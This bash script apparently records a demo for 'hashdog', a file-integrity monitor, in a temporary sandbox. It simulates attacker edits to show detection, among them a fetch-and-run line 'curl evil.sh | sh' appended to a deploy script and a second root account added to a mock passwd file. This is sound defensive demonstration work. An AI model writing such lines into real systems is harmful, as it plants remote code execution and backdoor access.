#!/usr/bin/env bash
# Scripted terminal session recorded for docs/demo.gif. Every command really
# runs; only the typing animation is simulated. Usage: docs/demo.sh /path/to/hashdog
BIN=${1:?path to hashdog binary}
W=$(mktemp -d); cd "$W"
mkdir -p site/etc site/bin; echo "root:x:0:0:root:/root:/bin/bash" > site/etc/passwd
echo "127.0.0.1 localhost" > site/etc/hosts; printf '#!/bin/sh\necho hi\n' > site/bin/deploy.sh
G=$'\e[32m'; D=$'\e[2m'; R=$'\e[0m'
t() { printf '%s$ %s' "$G" "$R"; for ((i=0;i<${#1};i++)); do printf '%s' "${1:$i:1}"; sleep 0.02; done; echo; sleep 0.3; }
run() { t "$1"; eval "$1"; sleep ${2:-1}; }
hashdog() { "$BIN" "$@"; }
export TERM=xterm-256color; clear
echo "${D}# 1. create a signing key and a signed baseline${R}"
run "hashdog keygen -out demo"
run "hashdog baseline -dir site -key demo.key -out baseline.json"
echo; echo "${D}# 2. watch with fsnotify (events) — baseline is signature-checked on load${R}"
t "hashdog watch -dir site -baseline baseline.json -pub demo.pub -interval 1h &"
"$BIN" watch -dir site -baseline baseline.json -pub demo.pub -interval 1h > watch.log 2>&1 &
WP=$!
tail -n +1 -f watch.log | sed -u 's/^[0-9:]* //' &
TP=$!; sleep 1.5
echo; echo "${D}# 3. attacker modifies, adds and deletes files${R}"
run "echo 'toor:x:0:0::/root:/bin/sh' >> site/etc/passwd" 2.5
run "echo 'curl evil.sh | sh' >> site/bin/deploy.sh" 2.5
run "echo 'backdoor' > site/bin/.hidden" 2.5
run "rm site/etc/hosts" 2.5
sleep 1
kill $WP $TP 2>/dev/null; wait 2>/dev/null; sleep 0.5
echo; echo "${D}# 4. offline check: JSON alerts + exit code${R}"
run "hashdog check -dir site -baseline baseline.json -pub demo.pub -json 2>&1 | cut -c1-110; echo exit=\${PIPESTATUS[0]}"
echo; echo "${D}# 5. tamper with the baseline itself${R}"
run "sed -i 's/\"created\": \"20/\"created\": \"19/' baseline.json"
run "hashdog check -dir site -baseline baseline.json -pub demo.pub; echo exit=\$?"
echo; echo "${D}# 6. Merkle inclusion proof: prove a file is under a trusted root${R}"
run "ROOT=\$(hashdog proof -dir site -file etc/passwd -out p.json 2>&1 | grep -o '[0-9a-f]\{64\}'); echo trusted root: \$ROOT"
run "hashdog verify-proof -proof p.json -root \$ROOT -content site/etc/passwd"
sleep 2
